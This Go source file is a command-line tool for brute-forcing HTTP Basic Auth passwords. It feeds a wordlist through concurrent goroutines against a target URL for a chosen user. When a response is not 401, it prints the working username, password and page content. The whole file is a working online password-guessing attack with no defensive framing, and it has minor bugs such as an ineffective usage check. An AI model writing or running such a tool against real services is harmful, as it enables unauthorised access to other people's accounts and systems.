/*
	Basic Auth remote bruteforcing
	@sha0coder
*/

package main

import "os"
import "fmt"
import "flag"
import "bufio"

func check(err error, msg string) {
	if err != nil {
		fmt.Println(msg)
		os.Exit(1)
	}
}

func urlCheck(url string) bool {
	fmt.Printf("checking %s ... ", url)

	R := NewRequests()
	_, code, _ := R.Get(url)
	if code == 0 {
		fmt.Println("Can't connect")
		os.Exit(1)
	}
	fmt.Printf(" %d\n", code)
	if code != 200 {
		return false
	}
	return true
}

func loadWordlist(wordlist string, c chan string) {
	file, err := os.Open(wordlist)
	check(err, "Can't load the wordlist")
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		c <- scanner.Text()
	}
	c <- "[EOF1337]"
	close(c)
}

func main() {
	var url *string = flag.String("url", "", "the url")
	var user *string = flag.String("user", "", "the username")
	var wordlist *string = flag.String("pw", "", "the username")
	var goroutines *int = flag.Int("go", 1, "num of concurrent goroutines")

	var i int
	flag.Parse()

	if *url == "" || *wordlist == "" {
		check(nil, "bad usage --help")
	}

	fmt.Printf("Loading wordlist ...\n")

	c := make(chan string, 6)
	go loadWordlist(*wordlist, c)

	for i = 0; i < *goroutines; i++ {
		go func(r int, c <-chan string) {
			var html string
			var code int

			R := NewRequests()

			for w := range c {
				if w == "[EOF1337]" {
					fmt.Println("end.\n")
					os.Exit(1)
				}

				fmt.Printf("\033[2K%s          \r", w)
				R.SetBasicAuth(*user, w)
				html, code, _ = R.Get(*url)

				if code != 401 && code != 0 {
					fmt.Printf("yeah, code:%d user:%s pwd:%s\n", code, *user, w)
					fmt.Println(html)
					fmt.Printf("---\nyeah, code:%d user:%s pwd:%s\n---\n", code, *user, w)
					os.Exit(1)
				}

			}
		}(i, c)
	}

	fmt.Printf("Scanning, press enter to interrupt.\n")
	fmt.Scanf("%d", &i)
	fmt.Printf("interrupted.")
}
